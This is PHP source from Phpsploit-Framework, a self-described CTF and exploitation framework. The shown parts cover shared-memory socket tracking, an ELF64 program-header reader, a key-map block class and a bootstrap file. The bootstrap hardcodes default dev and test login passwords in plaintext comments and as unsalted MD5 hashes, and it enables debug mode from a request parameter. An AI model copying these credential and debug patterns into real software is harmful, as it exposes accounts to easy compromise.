                    $_share_memory_block_write_length = Class_Base_Memory::write_share_memory ( $_share_memory_id , $share_memory_value , $index , Class_Base_Memory::DATA_FORMAT_TYPE_64_INTEGER_PACK );
                    if ( ! empty( $_share_memory_block_write_length ) ) {
                        $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $index ] = $share_memory_value;
                        return $index;
                    }
                }
            }
        }
        return false;
    }

    public static function delete_client_socket ( $share_memory_key , $share_memory_index )
    {
        if ( ( $share_memory_index >= 0 ) && ( $share_memory_index <= ( Class_Base_Memory::BLOCK_SIZE_1048576 - 8 ) ) ) {
            $_share_memory_id                                                               = Class_Base_Memory::open_share_memory ( $share_memory_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
            $_share_memory_block_write_length                                               = Class_Base_Memory::write_share_memory ( $_share_memory_id , 0 , $share_memory_index , Class_Base_Memory::DATA_FORMAT_TYPE_64_INTEGER_PACK );
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $share_memory_index ] = null;
            unset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $share_memory_index ] );
            return $_share_memory_block_write_length;
        }
        return false;
    }

    public static function clear_client_sockets ( $share_memory_key )
    {
        $_share_memory_id = Class_Base_Memory::open_share_memory ( $share_memory_key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Class_Base_Memory::BLOCK_SIZE_1048576 , Class_Base_Memory::FLAGS_SHARE_MEMORY_OPEN );
        for ( $index = 0 ; $index < Class_Base_Memory::BLOCK_SIZE_1048576 ; $index += 8 ) {
            Class_Base_Memory::write_share_memory ( $_share_memory_id , 0 , $index , Class_Base_Memory::DATA_FORMAT_TYPE_64_INTEGER_PACK );
            $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $index ] = null;
            unset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ][ $index ] );
        }
        Class_Base_Memory::clear_share_memory ( $_share_memory_id );
        $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ] = null;
        unset( $_SESSION[ "PHPSPLOIT_FRAMEWORK_CLIENT_SOCKETS_MEMORY" ] );
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-6
 * Time: 上午9:00
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Elf64_Program extends Class_Base
{
    private static $_program_types = array ( 0 , 1 , 2 , 3 , 4 , 5 , 6 , 0x60000000 , 0x6fffffff , 0x70000000 , 0x7fffffff );
    private static $_programs      = array ();

    public static function get_program_content ( $file_path , $program_type , $program_offset , $program_size )
    {
        if ( ( is_string ( $file_path ) ) && ( strlen ( $file_path ) > 0 ) && ( file_exists ( $file_path ) ) && ( is_file ( $file_path ) ) && ( is_integer ( $program_type ) ) && ( in_array ( $program_type , self::$_program_types ) ) && ( is_integer ( $program_offset ) ) && ( is_integer ( $program_size ) ) ) {
            $_file_tmp_point = fopen ( $file_path , "rb" );
            if ( ! empty( $_file_tmp_point ) ) {
                fseek ( $_file_tmp_point , $program_offset , SEEK_SET );
                $_program_content = @fread ( $_file_tmp_point , $program_size );
                fclose ( $_file_tmp_point );
                if ( ! is_null ( $_program_content ) ) {
                    if ( ( ! array_key_exists ( $file_path , self::$_programs ) ) || ( ! is_array ( self::$_programs[ $file_path ] ) ) ) {
                        self::$_programs[ $file_path ] = array ();
                    }
                    if ( ( ! array_key_exists ( $program_offset , self::$_programs[ $file_path ] ) ) || ( ! is_array ( self::$_programs[ $file_path ][ $program_offset ] ) ) ) {
                        self::$_programs[ $file_path ][ $program_offset ] = array ();
                    }
                    self::$_programs[ $file_path ][ $program_offset ][ "type" ]         = $program_type;
                    self::$_programs[ $file_path ][ $program_offset ][ "hex_type" ]     = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $program_type ) );
                    self::$_programs[ $file_path ][ $program_offset ][ "type_name" ]    = Class_Base_Elf::get_pt_type_name ( $program_type );
                    self::$_programs[ $file_path ][ $program_offset ][ "offset" ]       = $program_offset;
                    self::$_programs[ $file_path ][ $program_offset ][ "hex_offset" ]   = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $program_offset ) );
                    self::$_programs[ $file_path ][ $program_offset ][ "size" ]         = $program_size;
                    self::$_programs[ $file_path ][ $program_offset ][ "hex_size" ]     = ( ( '0x' ) . Class_Base_Elf::dec_to_hex ( $program_size ) );
                    self::$_programs[ $file_path ][ $program_offset ][ "content_type" ] = "ascii_char";
                    self::$_programs[ $file_path ][ $program_offset ][ "content" ]      = $_program_content;
                    return self::$_programs[ $file_path ][ $program_offset ];
                }
            }
        }
        return false;
    }

    public static function show_program_content ( $program_type , $program_content , &$program_content_type = null )
    {
        if ( $program_type == 3 ) {
            $_show_program_content = str_replace ( chr ( 0 ) , ( chr ( 32 ) ) , $program_content );
            $program_content_type  = "ascii_char";
        } else {
            $_show_program_content = Class_Base_Format::get_format_hex_content ( $program_content );
            $program_content_type  = "hex_char";
        }
        return $_show_program_content;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午4:59
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Block_Keys extends Class_Base_Block implements Interface_Base_Block_Keys
{
    private static $_key      = Interface_Base_BlockKey::KEYS;
    private        $_head     = null;
    private        $_content  = null;
    private        $_end_flag = null;

    public static function get_key ()
    {
        return Interface_Base_BlockKey::KEYS;
    }

    public static function set_block_key ( $key )
    {
        self::$_key = $key;
    }

    public static function get_block_key ()
    {
        return self::$_key;
    }

    public static function get_block_size ()
    {
        return self::SIZE_BLOCK;
    }

    public static function get_head_size ()
    {
        return Class_Base_BlockHead::get_head_size ();
    }

    public static function get_content_size ()
    {
        return self::MAP_SIZE;
    }

    public static function get_map_count ( $key )
    {
        $_count     = 0;
        self::$_key = $key;
        $_block_id  = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::MAP_SIZE ; $index += self::MAP_ITEM_SIZE ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::MAP_ITEM_SIZE , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( ! self::is_empty ( $_item ) ) {
                    $_count++;
                }
            }
        }
        return $_count;
    }

    public static function get_end_flag_size ()
    {
        return Class_Base_BlockEndFlag::get_end_flag_size ();
    }

    public static function is_empty ( $data )
    {
        if ( is_string ( $data ) ) {
            $data = str_replace ( "\0" , "" , $data );
        }
        $_bool = empty( $data );
        return $_bool;
    }

    public static function get_block ( $key )
    {
        self::$_key = $key;
        $_block_id  = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::SIZE_BLOCK );
        return $_block_id;
    }

    public static function read_block_string ( $key )
    {
        self::$_key = $key;
        $_block_id  = self::get_block ( $key );
        if ( self::is_empty ( $_block_id ) ) {
            return null;
        }
        $_block_string = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , self::SIZE_BLOCK , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        return $_block_string;
    }

    public static function create_head ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag )
    {
        $_head = Class_Base_BlockHead::create_block_head ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag );
        return $_head;
    }

    public static function create_content ( $content )
    {
        $_content = Class_Base_BlockContent::create_block_content ( $content , self::get_content_size () );
        return $_content;
    }

    public static function create_end_flag ( $end_flag )
    {
        $_end_flag = Class_Base_BlockEndFlag::create_block_end_flag ( $end_flag );
        return $_end_flag;
    }

    public static function create_block_data ( $head , $content , $end_flag )
    {
        $_block_keys = new Class_Base_Block_Keys( $head , $content , $end_flag );
        return $_block_keys;
    }

    public static function init_block_data ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag , $content , $end_flag )
    {
        $_head         = self::create_head ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag );
        $_content      = self::create_content ( $content );
        $_end_flag     = self::create_end_flag ( $end_flag );
        $_block_keys   = self::create_block_data ( $_head , $_content , $_end_flag );
        $_block_string = $_block_keys->create_block_string ();
        $_block_id     = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::get_block_size () );
        $_length       = Class_Base_Memory::write_share_memory ( $_block_id , $_block_string , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        return $_length;
    }

    public static function read_head ( $key )
    {
        self::$_key = $key;
        $_block_id  = self::get_block ( $key );
        if ( self::is_empty ( $_block_id ) ) {
            return null;
        }
        $_head = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_BlockHead::SIZE_BLOCK_HEAD , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        return $_head;
    }

    public static function read_content ( $key )
    {
        self::$_key = $key;
        $_block_id  = self::get_block ( $key );
        if ( self::is_empty ( $_block_id ) ) {
            return null;
        }
        $_data = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD ) , self::MAP_SIZE , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        return $_data;
    }

    public static function read_end_flag ( $key )
    {
        self::$_key = $key;
        $_block_id  = self::get_block ( $key );
        if ( self::is_empty ( $_block_id ) ) {
            return null;
        }
        $_end_flag = Class_Base_Memory::read_share_memory ( $_block_id , ( self::SIZE_BLOCK - Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG ) , Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
        return $_end_flag;
    }

    public static function exist_map_item_key ( $key , $item_key )
    {
        self::$_key = $key;
        $_block_id  = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::MAP_SIZE ; $index += self::MAP_ITEM_SIZE ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::MAP_ITEM_SIZE , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( ! self::is_empty ( $_item ) ) {
                    $_item_key = Class_Base_Format::hex_to_dec ( substr ( $_item , 0 , self::SIZE_BLOCK_KEY ) );
                    if ( $_item_key == $item_key ) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    public static function get_map_item ( $key , $item_key )
    {
        self::$_key = $key;
        $_block_id  = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::MAP_SIZE ; $index += self::MAP_ITEM_SIZE ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::MAP_ITEM_SIZE , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( ! self::is_empty ( $_item ) ) {
                    $_item_key = Class_Base_Format::hex_to_dec ( substr ( $_item , 0 , self::SIZE_BLOCK_KEY ) );
                    if ( $_item_key == $item_key ) {
                        return $_item;
                    }
                }
            }
        }
        return null;
    }

    public static function set_map_item ( $key , $item_key , $item_size )
    {
        self::$_key = $key;
        $_length    = self::write_map_item ( $key , $item_key , $item_size );
        return $_length;
    }

    public static function get_map_item_size ( $key , $item_key )
    {
        self::$_key = $key;
        $_block_id  = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::MAP_SIZE ; $index += self::MAP_ITEM_SIZE ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::MAP_ITEM_SIZE , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( ! self::is_empty ( $_item ) ) {
                    $_item_key = Class_Base_Format::hex_to_dec ( substr ( $_item , 0 , self::SIZE_BLOCK_KEY ) );
                    if ( $_item_key == $item_key ) {
                        $_item_size = Class_Base_Format::hex_to_dec ( substr ( $_item , self::SIZE_BLOCK_KEY , self::SIZE_BLOCK_SIZE ) );
                        return $_item_size;
                    }
                }
            }
        }
        return null;
    }

    public static function write_map_item ( $key , $item_key , $item_size )
    {
        self::$_key = $key;
        $_exist     = self::exist_map_item_key ( $key , $item_key );
        if ( ! $_exist ) {
            $_block_id = self::get_block ( $key );
            if ( ! self::is_empty ( $_block_id ) ) {
                $_head = self::get_head ( $key );
                if ( Class_Base_Format::is_empty ( $_head ) ) {
                    self::init_block_data ( Interface_Base_BlockName::NAME_BLOCK_KEYS , $key , self::MAP_SIZE , Interface_Base_BlockStatus::STATUS_BLOCK_ENABLED , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Interface_Base_BlockType::TYPE_BLOCK_KEYS , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_BlockHead::FLAG_BLOCK_HEAD_END , null , Class_Base_BlockEndFlag::FLAG_BLOCK_END );
                }
                for ( $index = 0 ; $index < self::MAP_SIZE ; $index += self::MAP_ITEM_SIZE ) {
                    $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::MAP_ITEM_SIZE , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( self::is_empty ( $_item ) ) {
                        $_item_key  = Class_Base_Format::dec_to_hex ( $item_key );
                        $_item_size = Class_Base_Format::dec_to_hex ( $item_size );
                        $_item      = ( $_item_key . $_item_size );
                        $_length    = Class_Base_Memory::write_share_memory ( $_block_id , $_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                        return $_length;
                    }
                }
            }
        } else {
            $_block_id = self::get_block ( $key );
            if ( ! self::is_empty ( $_block_id ) ) {
                $_head = self::get_head ( $key );
                if ( Class_Base_Format::is_empty ( $_head ) ) {
                    self::init_block_data ( Interface_Base_BlockName::NAME_BLOCK_KEYS , $key , self::MAP_SIZE , Interface_Base_BlockStatus::STATUS_BLOCK_ENABLED , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , Interface_Base_BlockType::TYPE_BLOCK_KEYS , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_BlockHead::FLAG_BLOCK_HEAD_END , null , Class_Base_BlockEndFlag::FLAG_BLOCK_END );
                }
                for ( $index = 0 ; $index < self::MAP_SIZE ; $index += self::MAP_ITEM_SIZE ) {
                    $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::MAP_ITEM_SIZE , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                    if ( ! self::is_empty ( $_item ) ) {
                        $_item_key = Class_Base_Format::hex_to_dec ( substr ( $_item , 0 , self::SIZE_BLOCK_KEY ) );
                        if ( $item_key == $_item_key ) {
                            $_item_size = Class_Base_Format::dec_to_hex ( $item_size );
                            $_length    = Class_Base_Memory::write_share_memory ( $_block_id , $_item_size , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index + self::SIZE_BLOCK_KEY ) , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                            return $_length;
                        }
                    }
                }
            }
        }
        return false;
    }

    public static function set_map ( $key , $map )
    {
        $_write_result = array ();
        self::$_key    = $key;
        if ( is_array ( $map ) ) {
            foreach ( $map as $k => $v ) {
                $_length = self::write_map_item ( $key , $k , $v );
                if ( self::is_empty ( $_length ) ) {
                    $_write_result[ $k ] = 0;
                } else {
                    $_write_result[ $k ] = 1;
                }

            }
        }
        return $_write_result;
    }

    public static function read_map ( $key )
    {
        self::$_key = $key;
        $_map       = array ();
        $_block_id  = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::MAP_SIZE ; $index += self::MAP_ITEM_SIZE ) {
                $_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::MAP_ITEM_SIZE , Class_Base_Memory::DATA_FORMAT_TYPE_STRING_NULL_FILL_PACK );
                if ( ! self::is_empty ( $_item ) ) {
                    $_item_key  = Class_Base_Format::hex_to_dec ( substr ( $_item , 0 , self::SIZE_BLOCK_KEY ) );
                    $_item_size = Class_Base_Format::hex_to_dec ( substr ( $_item , self::SIZE_BLOCK_KEY , self::SIZE_BLOCK_SIZE ) );
                    if ( ! self::is_empty ( $_item_key ) ) {
                        $_map[ $_item_key ] = $_item_size;
                    }
                }
            }
        }
        return $_map;
    }

    public static function clear ( $key )
    {
        $_block_id = self::get_block ( $key );
        if ( ! empty( $_block_id ) ) {
            $_block_type = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_BlockHead::get_head_block_type_offset () , Class_Base_BlockHead::get_head_block_type_size () );
            if ( $_block_type == Interface_Base_BlockType::TYPE_BLOCK_KEYS ) {
                $_bool = Class_Base_Memory::clear_share_memory_by_key ( $key , self::SIZE_BLOCK );
                return $_bool;
            }
        }
        return false;
    }

    private static $_check_keys_status = array ();

    public static function get_check_keys_status ( $key )
    {
        if ( array_key_exists ( $key , self::$_check_keys_status ) ) {
            return self::$_check_keys_status[ $key ];
        }
        return null;
    }

    public static function is_check_keys_status ( $key )
    {
        if ( array_key_exists ( $key , self::$_check_keys_status ) ) {
            if ( ! empty( self::$_check_keys_status[ $key ] ) ) {
                return true;
            }
        }
        return false;
    }

    public static function enable_check_keys_status ( $key )
    {
        self::$_check_keys_status[ $key ] = 1;
    }

    public static function start_check_status ( $key )
    {
        if ( self::is_check_keys_status ( $key ) ) {
            return false;
        }
        self::enable_check_keys_status ( $key );
        return true;
    }

    public static function clear_check_status ( $key )
    {
        if ( array_key_exists ( $key , self::$_check_keys_status ) ) {
            self::$_check_keys_status[ $key ] = null;
            unset( self::$_check_keys_status[ $key ] );
        }
    }

    public static function check_object_params ( $head , $content , $end_flag )
    {
        if ( ( ( ! is_object ( $head ) ) && ( ! is_string ( $head ) ) ) || ( ( ! is_object ( $content ) ) && ( ! is_string ( $content ) ) ) || ( ( ! is_object ( $end_flag ) ) && ( ! is_string ( $end_flag ) ) ) ) {
            throw new \Exception( "head or data or end_flag is not a string or object" , 0 );
        }
        if ( is_object ( $head ) && is_object ( $content ) && is_object ( $end_flag ) ) {
            if ( ( ! ( $head instanceof Class_Base_BlockHead ) ) || ( ! ( $content instanceof Class_Base_BlockContent ) ) || ( ! ( $end_flag instanceof Class_Base_BlockEndFlag ) ) ) {
                throw new \Exception( "head or data or end_flag is error , head( " . print_r ( $head , true ) . " ) , data : ( " . $content . " ) , end_flag : ( " . $end_flag . " ) " , 0 );
            }
            if ( ( strlen ( $head->get_block_string () ) != Class_Base_BlockHead::SIZE_BLOCK_HEAD ) || ( $content->get_encode_content_size () != $head->get_content_size () ) || ( strlen ( $end_flag->get_block_string () ) != Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG ) ) {
                throw new \Exception( "head size or data size or end_flag size is error , head object size (" . ( strlen ( $head->get_block_string () ) ) . ") , head content_size ( " . $head->get_content_size () . " ) , content size ( " . $content->get_content_size () . " ) , end_flag size ( " . ( strlen ( $end_flag->get_block_string () ) ) . " ) " , 0 );
            }
        } else if ( is_string ( $head ) && is_string ( $content ) && is_string ( $end_flag ) ) {
            if ( strlen ( $head ) != Class_Base_BlockHead::get_head_size () ) {
                throw new \Exception( "unique index block head size is error , head param size( " . strlen ( $head ) . " ) , head size ( " . Class_Base_BlockHead::get_head_size () . " ) " , 0 );
            }
            $_block_key = substr ( $head , Class_Base_BlockHead::get_head_block_key_offset () , Class_Base_BlockHead::get_head_block_key_size () );
            if ( Class_Base_Format::is_empty ( $_block_key ) || ( ! Class_Base_Format::is_min_to_max_hex ( $_block_key , Class_Base_Format::HEX_KEY_MIN_VALUE , Class_Base_Format::HEX_KEY_MAX_VALUE ) ) ) {
                throw new \Exception( "unique index block head key is error , key ( " . $_block_key . " ) " , 0 );
            }
            $_data_size = substr ( $head , Class_Base_BlockHead::get_head_content_size_offset () , Class_Base_BlockHead::get_head_content_size_size () );
            $_data_size = Class_Base_Format::hex_to_dec ( $_data_size );
            if ( strlen ( $content ) != $_data_size ) {
                throw new \Exception( "unique index block data size is error , data param size ( " . strlen ( $content ) . " ) , data size ( " . $_data_size . " ) " , 0 );
            }
            if ( strlen ( $end_flag ) != Class_Base_BlockEndFlag::get_end_flag_size () ) {
                throw new \Exception( "unique index block end_flag size is error , end_flag param size ( " . strlen ( $end_flag ) . " ) , end_flag size ( " . Class_Base_BlockEndFlag::get_end_flag_size () . " ) " , 0 );
            }
        } else {
            throw new \Exception( "unique index block params is error ,  head ( " . print_r ( $head , true ) . " ) , data ( " . print_r ( $content , true ) . " ) , end_flag ( " . print_r ( $end_flag , true ) . " ) " , 0 );
        }
    }

    public function __construct ( $head , $content , $end_flag )
    {
        self::check_object_params ( $head , $content , $end_flag );
        if ( is_object ( $head ) && is_object ( $content ) && is_object ( $end_flag ) ) {
            $this->_head     = $head->get_block_string ();
            $this->_content  = $content->get_block_string ();
            $this->_end_flag = $end_flag->get_block_string ();
        } else if ( is_string ( $head ) && is_string ( $content ) && is_string ( $end_flag ) ) {
            $this->_head     = $head;
            $this->_content  = $content;
            $this->_end_flag = $end_flag;
        }
        parent::__construct ( $this->_head , $this->_content , $this->_end_flag );
    }

    public function __destruct ()
    {
        $this->_head     = null;
        $this->_content  = null;
        $this->_end_flag = null;
    }

    public function create_block_string ()
    {
        $_block_string = ( $this->_head . $this->_content . $this->_end_flag );
        return $_block_string;
    }

    public function get_create_block_string_size ()
    {
        $_block_string        = self::create_block_string ();
        $_block_string_length = strlen ( $_block_string );
        return $_block_string_length;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-16
 * Time: 下午7:45
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

session_start ();
date_default_timezone_set ( "PRC" );

function is_development_environment ()
{
    $_development_environment_files = array (
        "Class_Main.php" ,
        "Class_Root.php" ,
        "Class_Base.php" ,
        "Class_Operate.php" ,
        "Class_Controller.php" ,
        "Class_View.php" ,
        "Interface_Main.php" ,
        "Interface_Root.php" ,
        "Interface_Base.php" ,
        "Interface_Operate.php" ,
        "Interface_Controller.php" ,
        "Interface_View.php" ,
    );
    foreach ( $_development_environment_files as $index => $file ) {
        if ( ( ! file_exists ( $file ) ) || ( ! is_file ( $file ) ) ) {
            return false;
        }
    }
    return true;
}

function check_key_constant_define ()
{
    if ( ( ! defined ( "DEBUG" ) ) || ( ! is_integer ( DEBUG ) ) ) {
        throw new \Exception( "Key constant ( DEBUG ) does not exist!" );
    }
    if ( ( ! defined ( "DEVLOP" ) ) || ( ! is_integer ( DEVLOP ) ) ) {
        throw new \Exception( "Key constant ( DEVLOP ) does not exist!" );
    }
    if ( ( ! defined ( "PRIVILEGE_USER_MODULE_USER" ) ) || ( empty( PRIVILEGE_USER_MODULE_USER ) ) ) {
        throw new \Exception( "Key constant ( PRIVILEGE_USER_MODULE_USER ) does not exist!" );
    }
    if ( ( ! defined ( "PRIVILEGE_USER_MODULE_PASSWORD" ) ) || ( empty( PRIVILEGE_USER_MODULE_PASSWORD ) ) ) {
        throw new \Exception( "Key constant ( PRIVILEGE_USER_MODULE_PASSWORD ) does not exist!" );
    }
}

function is_cli ()
{
    return ( ( PHP_SAPI == "cli" ) || ( php_sapi_name () == "cli" ) );
}

function is_root_permissions ()
{
    if ( ( 0 == posix_getuid () ) || ( 0 == posix_getgid () ) ) {
        return true;
    } else {
        return false;
    }
}

function check_extensions ( $extension_name )
{
    $extensions = get_loaded_extensions ();
    if ( in_array ( $extension_name , $extensions ) ) {
        return true;
    }
    $extension_name = strtolower ( $extension_name );
    foreach ( $extensions as $index => $extension ) {
        $extensions[ $index ] = strtolower ( $extension );
        if ( $extension_name == $extensions[ $index ] ) {
            return true;
        }
    }
    return false;
}

function check_privilege_environment ()
{
    check_key_constant_define ();
    if ( empty( DEVLOP ) ) {
        if ( PRIVILEGE_USER_MODULE_USER == "38305ac7e5f1b870f6e92aef5e281b2d" ) {
            throw new \Exception( "Due to security reasons, the default initialization username of the framework cannot be used in non development mode!" , 0 );
        }
        if ( PRIVILEGE_USER_MODULE_PASSWORD == "6f02faa1775d964e58b227e0ef3fa7fd" ) {
            throw new \Exception( "Due to security reasons, the default initialization password of the framework cannot be used in non development mode!" , 0 );
        }
        if ( ( PRIVILEGE_USER_MODULE_USER == "38305ac7e5f1b870f6e92aef5e281b2d" ) && ( PRIVILEGE_USER_MODULE_PASSWORD == "6f02faa1775d964e58b227e0ef3fa7fd" ) && ( ! is_cli () ) && ( filter_var ( $_SERVER[ "SERVER_ADDR" ] , FILTER_FLAG_NO_PRIV_RANGE ) ) ) {
            throw new \Exception( "You cannot use a privileged account and password dedicated to development mode to run Phpsploit Framework software under a public IP, as this poses a significant security risk! If you need to run the Phpsploit Framework software in a public IP environment, the correct approach is to use a privileged account and password dedicated to production mode to run the Phpsploit Framework software!" , 0 );
        }
    }
    if ( ( PRIVILEGE_USER_MODULE_USER == "1cbaaf7f640765ae8f4e0766ea5236ca" ) && ( PRIVILEGE_USER_MODULE_PASSWORD == "259eb52b05e6e2bafb1541afe061ba75" ) && ( ! is_cli () ) && ( filter_var ( $_SERVER[ "SERVER_ADDR" ] , FILTER_FLAG_NO_PRIV_RANGE ) ) ) {
        throw new \Exception( "You cannot use a privileged account and password dedicated to testing mode to run Phpsploit Framework software under a public IP, as this poses a significant security risk! If you need to run the Phpsploit Framework software in a public IP environment, the correct approach is to use a privileged account and password dedicated to production mode to run the Phpsploit Framework software!" , 0 );
    }
}

//develop privilege init user :     0day
//develop privilege init password : 0day_phpsploit-framework_2023v1.0
//
//develop privilege init user md5 :     38305ac7e5f1b870f6e92aef5e281b2d
//develop privilege init password md5 : 6f02faa1775d964e58b227e0ef3fa7fd

//test privilege init user :     huc0day
//test privilege init password : 6PbmX),_+dyc@OIt3C
//
//test privilege init user md5 :     1cbaaf7f640765ae8f4e0766ea5236ca
//test privilege init password md5 : 259eb52b05e6e2bafb1541afe061ba75


define ( "PRIVILEGE_USER_MODULE_USER" , "1cbaaf7f640765ae8f4e0766ea5236ca" );
define ( "PRIVILEGE_USER_MODULE_PASSWORD" , "259eb52b05e6e2bafb1541afe061ba75" );

define ( 'DEBUG' , ( ( empty( $_REQUEST ) ) ? 0 : ( ( ! is_array ( $_REQUEST ) ) ? 0 : ( ( empty( $_REQUEST[ "debug" ] ) ) ? 0 : ( ( intval ( $_REQUEST[ "debug" ] ) == 0 ) ? 0 : ( 1 ) ) ) ) ) );
define ( "DEVLOP" , ( ( is_development_environment () ? 1 : 0 ) ) );

define ( "DEVELOP_DEFAULT_FRAMEWORK_FOLDER" , dirname ( __FILE__ ) );
define ( "PRODUCTION_DEFAULT_FRAMEWORK_FOLDER" , dirname ( __FILE__ ) );
